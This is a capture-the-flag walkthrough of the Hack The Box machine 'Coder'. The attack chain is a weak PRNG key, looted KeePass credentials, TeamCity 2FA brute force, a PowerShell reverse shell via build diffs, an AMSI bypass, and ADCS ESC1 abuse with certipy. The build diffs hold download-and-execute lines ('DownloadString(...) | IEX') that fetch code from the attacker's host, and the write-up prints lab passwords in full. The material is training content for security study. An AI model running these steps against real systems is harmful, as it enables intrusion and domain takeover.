---
description: Had great help from @Ruycraft1514 for PE.
---

# Coder

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.198.189 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 04:35 EDT
Warning: 10.129.198.189 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.198.189
Host is up (0.24s latency).
Not shown: 62699 closed tcp ports (conn-refused), 2811 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49686/tcp open  unknown
49687/tcp open  unknown
49695/tcp open  unknown
49700/tcp open  unknown
49710/tcp open  unknown
49712/tcp open  unknown
51472/tcp open  unknown
```

AD machine! Port 80 reveals a default IIS server, so let's not start from there.

### SMB Shares

We can find some null shares that are readable with `smbmap`:

```
$ smbmap -u 'guest' -p '' -H 10.129.198.189
[+] IP: 10.129.198.189:445      Name: 10.129.198.189                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Development                                             READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   READ ONLY
```

The most interesting one was the `Development` one which contained some files. We can connect via `smbclient`:

```
smb: \> cd "Temporary Projects"
smb: \Temporary Projects\> ls
  .                                   D        0  Fri Nov 11 17:19:03 2022
  ..                                  D        0  Fri Nov 11 17:19:03 2022
  Encrypter.exe                       A     5632  Fri Nov  4 12:51:59 2022
  s.blade.enc                         A     3808  Fri Nov 11 17:17:08 2022

                6232831 blocks of size 4096. 907304 blocks available
```

We can download these files for further analysis. Probably need to decode this encrypted file for a password somehow.

### Weak PRNG + Keepass

The file is a Windows executable:

```
$ file Encrypter.exe 
Encrypter.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

So we can port this to a Windows VM for analysis via DnSpy. Here, we can see that the file uses AES for something:

<figure><img src="../../.gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>

We can take a look at the `main` function:

```csharp
// AES
// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
public static void Main(string[] args)
{
	bool flag = args.Length != 1;
	if (flag)
	{
		Console.WriteLine("You must provide the name of a file to encrypt.");
	}
	else
	{
		FileInfo fileInfo = new FileInfo(args[0]);
		string destFile = Path.ChangeExtension(fileInfo.Name, ".enc");
		long value = DateTimeOffset.Now.ToUnixTimeSeconds();
		Random random = new Random(Convert.ToInt32(value));
		byte[] array = new byte[16];
		random.NextBytes(array);
		byte[] array2 = new byte[32];
		random.NextBytes(array2);
		byte[] array3 = AES.EncryptFile(fileInfo.Name, destFile, array2, array);
	}
}
```

Right, so this uses the **time**. On paper, this is secure, **if they didn't reveal the time it was encrypted**. Refer to the SMB directory listing and we can see the time the file was uploaded was `Fri Nov 11 17:17:08 2022`. This becomes `1668187028` when we convert it to the UnixTimeSeconds.&#x20;

This uses an insecure PRNG generator. With the timestamp as the seed, we can quickly find the correct key and IV needed by just printing it out using some online C# compiler:

{% code overflow="wrap" %}
```csharp
using System;
using System.IO;
using System.Security.Cryptography;

int value = 1668271028;
Random random = new Random(value);
byte[] array = new byte[16];
random.NextBytes(array);
Console.WriteLine(BitConverter.ToString(array));
byte[] array2 = new byte[32];
random.NextBytes(array2);
Console.WriteLine(BitConverter.ToString(array2));

/*
3E65D265E62244DF1F308C6836AD215B # iv
0E674FD72BA946B290BE0A5E88672402587129B780DB134808C1EDCE0BFEB48C # key
*/
```
{% endcode %}

Then, we can take these values and upload the file to CyberChef to decrypt it and download it as a 7z file. When extracted, we get a `kdbx` file, which is a KeePass database and a `.key` file, presumably for the database.

We can use `kpcli` without any master password to access this:

```
$ kpcli --key=keepass.key --kdb=s.blade.kdbx 
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls
=== Groups ===
Root/
kpcli:/> cd Root
kpcli:/Root> ls
=== Entries ===
0. Authenticator backup codes                                             
1. O365                                                                   
2. Teamcity                                         teamcity-dev.coder.htb
kpcli:/Root>
```

It seems we have a URL now. Here's the data from the other fields:

```
Title: Authenticator backup codes
Uname: 
 Pass: 
  URL: 
Notes: {
         "6132e897-44a2-4d14-92d2-12954724e83f": {
           "encrypted": true,
           "hash": "6132e897-44a2-4d14-92d2-12954724e83f",
           "index": 1,
           "type": "totp",
           "secret": "U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2",
           "issuer": "TeamCity",
           "account": "s.blade"
         },
         "key": {
           "enc": "U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1",
           "hash": "$argon2id$v=19$m=16384,t=1,p=1$L/vKleu5gFis+GLZbROCPw$OzW14DA0kdgIjCbo6MPDYoh+NEHnNCNV"
         }
       }

Title: O365
Uname: s.blade@coder.htb
 Pass: AmcwNO60Zg3vca3o0HDrTC6D

Title: Teamcity
Uname: s.blade
 Pass: veh5nUSZFFoqz9CrrhSeuwhA
  URL: https://teamcity-dev.coder.htb
```

We can now head to that URL.

### TeamCity

We would see a login page, and we already have credentials for it:

<figure><img src="../../.gitbook/assets/image (2848).png" alt=""><figcaption></figcaption></figure>

Then, we would see a 2FA Mechanism in place:

<figure><img src="../../.gitbook/assets/image (1134).png" alt=""><figcaption></figcaption></figure>

I wasn't sure how to go about finding this, so I just brute forced it because it doesn't seem to have any account lockout. I used Burp Intruder to do this:

<figure><img src="../../.gitbook/assets/image (1341).png" alt=""><figcaption></figcaption></figure>

This works, but is hella slow.&#x20;

### Better Brute Force

Use this to generate all possible codes:

```python
pw_list = [f"{password:06d}" for password in range(1000000)]
for i in pw_list:
	print(i)
# python3 wordlist.py > possible_codes
```

Capture a request from Burpsuite for the POST request and then feed it to `ffuf`:

```bash
ffuf -request req -w possible_codes -t 70 -fs 89 > output
```

Then just monitor the output file for any entries that end up inside. This would be the correct code used. This takes around 10-20 minutes, which is a lot faster.

<figure><img src="../../.gitbook/assets/image (2938).png" alt=""><figcaption></figcaption></figure>

Then we can login!

### AMSI Bypass + PS Shell

TeamCity is a CI/CD dashboard, and I'm 99% sure we can gain access by building some kind of project that executes code on the computer. Just need to find out how.&#x20;

When checking the build that we have, we can upload a file here:

<figure><img src="../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

I read more here:

{% embed url="https://www.jetbrains.com/help/teamcity/personal-build.html" %}

In short, a unified diff file would allow us to append more stuff to the end of the current build, which is obviously not good. Some further enumeration revealed that this uses Powershell.

<figure><img src="../../.gitbook/assets/image (3911).png" alt=""><figcaption></figcaption></figure>

The answer is simple. Include some small Powershell code that would execute some commands to download a reverse shell. So I created a quick diff file like this to test:

{% code overflow="wrap" %}
```
--- hello_world.ps1        2023-04-05 04:22:08.640184787 -0400
+++ hello_world.ps1        2023-04-05 04:21:40.020285109 -0400
@@ -0,0 +1 @@
+(New-Object System.Net.WebClient).DownloadString('http://10.10.16.4/downloadmyfiles') | IEX
```
{% endcode %}

Uploading it and running gives me this:

<figure><img src="../../.gitbook/assets/image (2143).png" alt=""><figcaption></figcaption></figure>

Success! I tried to download and run Invoke-PowerShellTcp but it didn't work. Probably is some kind of firewall or security features present on the site. As such, we need to include another Powershell script to bypass it.

On my research, I found this super useful repository:

{% embed url="https://github.com/Karmaz95/evasion/blob/main/bamsi.txt" %}

Using their `bamsi.txt`, we can bypass the AMSI that is (probably) present on the server via unload `amsi.dll`.&#x20;

```
--- hello_world.ps1        2023-04-05 04:22:08.640184787 -0400
+++ hello_world.ps1        2023-04-05 04:21:40.020285109 -0400
@@ -0,0 +1,2 @@
+(New-Object System.Net.WebClient).DownloadString('http://10.10.16.4/hello.ps1') | IEX
+(New-Object System.Net.WebClient).DownloadString('http://10.10.16.4/shell.ps1') | IEX
```

Then just upload this file with a basic Powershell reverse shell, and it would work!

<figure><img src="../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>

## User Access

I should note that this is a rather unstable shell...and it quits on you VERY frequently due to the operation timing out on TeamCity.&#x20;

### TeamCity Administrator Fail

Now that we have access as the service user, we don't have access to anything special. Reading more about administrators in TeamCity, I came across this:

{% embed url="https://www.jetbrains.com/help/teamcity/super-user.html" %}

Based on this, we just need to head to `C:\TeamCity\logs` and run `type * | Select-String "Super user authentication token"`.&#x20;

```
[2023-04-04 18:04:14,034] console                           [Info] [TeamCity] Super user authentication token: 
6423624625049719391 (use empty username with the token as the password to access the server)
```

Following the instructions, we would gain access as the administrator of TeamCity rather easily.

<figure><img src="../../.gitbook/assets/image (1802).png" alt=""><figcaption></figcaption></figure>

As the administrator, we see some additional stuff like this thing:

<figure><img src="../../.gitbook/assets/image (4047).png" alt=""><figcaption></figcaption></figure>

ADCS? Might need this for later. Anyways as this user, we can add new build steps on the builds. I simply added a new step whereby it would execute the same powershell as above.

<figure><img src="../../.gitbook/assets/image (3382).png" alt=""><figcaption></figcaption></figure>

But running just seems to give me a shell as the service user still. But at least the shell never times out unless I want it to.

### Finding Credentials

Reading online tells me that there's a Data Directory present within TeamCity, and we can view that through Administration > Global Settings. Because we upload `.diff` files, there is likely a folder that stores all the changes made. We can find the file here:

{% code overflow="wrap" %}
```
PS C:\ProgramData\JetBrains\TeamCity\system\changes> type 101.changes.diff
<TRUNCATED>
+$key = Get-Content ".\key.key"
+$pass = (Get-Content ".\enc.txt" | ConvertTo-SecureString -Key $key)
+$cred = New-Object -TypeName System.Management.Automation.PSCredential ("coder\e.black",$pass)
 $emailFrom = 'pkiadmins@coder.htb'
 $emailCC = 'e.black@coder.htb'
 $emailTo = 'itsupport@coder.htb'
 $smtpServer = 'smtp.coder.htb'
-Send-MailMessage -SmtpServer $smtpServer -To $emailTo -Cc $emailCC -From $emailFrom -Subject $subject -Body $message -BodyAsHtml -Priority High
+Send-MailMessage -SmtpServer $smtpServer -To $emailTo -Cc $emailCC -From $emailFrom -Subject $subject -Body $message -BodyAsHtml -Priority High -Credential $cred
 }
 
diff --git a/enc.txt b/enc.txt
new file mode 100644
index 0000000..d352634
--- /dev/null
+++ b/enc.txt
@@ -0,0 +1,2 @@
+76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQAN
+AA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA==
diff --git a/key.key b/key.key
new file mode 100644
index 0000000..a6285ed
--- /dev/null
+++ b/key.key
@@ -0,0 +1,32 @@
+144
+255
+52
+33
+65
+190
+44
+106
+131
+60
+175
+129
+127
+179
+69
+28
+241
+70
+183
+53
+153
+196
+10
+126
+108
+164
+172
+142
+119
+112
+20
+122
```
{% endcode %}

This is a Powershell Secure String encoding using a key. We can decode this here if you're lazy after some formatting:

{% embed url="https://www.wietzebeukema.nl/powershell-securestring-decoder/" %}

Decrypting this would give us the user's credentials as remote Powershell was being used here. It also tells us that `evil-winrm` can be used to login since the user is part of the Remote Management Group.

This would decrypt to give `ypOSJXPqlDOxxbQSfEERy300`, which we can easily use to `evil-winrm` in as the user and capture the user flag.

<figure><img src="../../.gitbook/assets/image (1504).png" alt=""><figcaption></figcaption></figure>

## AD Privilege Escalation

### PKI Admins

The user had access to these groups viewable from `net user e.black`:

```
Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *PKI Admins
```

PKI Admins sounds like the next step in the exploit chain. Also, earlier we found some kind of ADCS thing we had to use.

> Active Directory Certificate Services provides customizable services for issuing and managing digital certificates used in software security systems that employ public key technologies.

If you're unfamiliar with what this does, you can read more here:

{% embed url="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831740(v=ws.11)" %}

The first thing we need to do is to enumerate all possible certificates to find what is vulnerable within this machine. This can be done using `certipy`.&#x20;

Unfortunately, there won't be any vulnerable templates that we can exploit because none of the templates present give us any enrollment permissions. Since the user is part of PKI Admins, we can take a closer look at the role and infer what permissions we have. I used Bloodhound to map the permissions, and didn't find much apart from this:

<figure><img src="../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

So `e.black` can manage templates for the ADCS instance. Since we could not find any templates to abuse, perhaps we can **add one.** We just need to find a template for a certificate, add it and give PKI Admins enrollment rights to abuse this and request an administrator TGT.

We can use this tool to do so:

{% embed url="https://github.com/GoateePFE/ADCSTemplate" %}

Next, we need to find a JSON certificate template. Since we are adding a new certificate template with custom permissions and name based on our own implementation, we can use an `ESC1` template. This one here works for the machine:

{% embed url="https://github.com/Orange-Cyberdefense/GOAD/blob/4cc6cbc1bdc86a236649d6c1e2c0dbf856bedeb6/ansible/roles/adcs_templates/files/ESC1.json" %}

Download the Powershell and JSON files to the machine and perform the following:

{% code overflow="wrap" %}
```powershell
Import-Module .\ADCSTemplate.psm1
Export-Template -DisplayName ESC1 > .\default.json
Get-Content -Path "C:\Users\e.black\esc1.json" | Set-Content -Path "C:\Users\e.black\default.json"
New-ADCSTemplate -DisplayName ESC1 -JSON (Get-Content .\default.json -Raw) -Publish -Identity "CODER\PKI Admins"
```
{% endcode %}

What these commands do is:

* First generate a blank template file, then copy over the contents of the ESC1 JSON to create a certificate template file `default.json` that would be compatible with the machine
* Create a new ADCSTemplate file using `default.json` and allow the PKI Admins group to have enrol permissions.

Afterwards, we can run `certipy` to get a PFX file for the administrator. Keep in mind to do these steps fast because there's a scheduled task resetting the certificates.&#x20;

{% code overflow="wrap" %}
```bash
certipy req -username e.black@coder.htb -password <pass> -ca coder-DC01-CA -target dc01.coder.htb -template esc1 -dc-ip <ip> -upn administrator@coder.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2976).png" alt=""><figcaption></figcaption></figure>

This would retrieve the administrator PFX for us to use. We can then use this to retrieve the NT Hash for the administrator and login using `evil-winrm`:

<figure><img src="../../.gitbook/assets/image (2196).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (513).png" alt=""><figcaption></figcaption></figure>

Rooted!
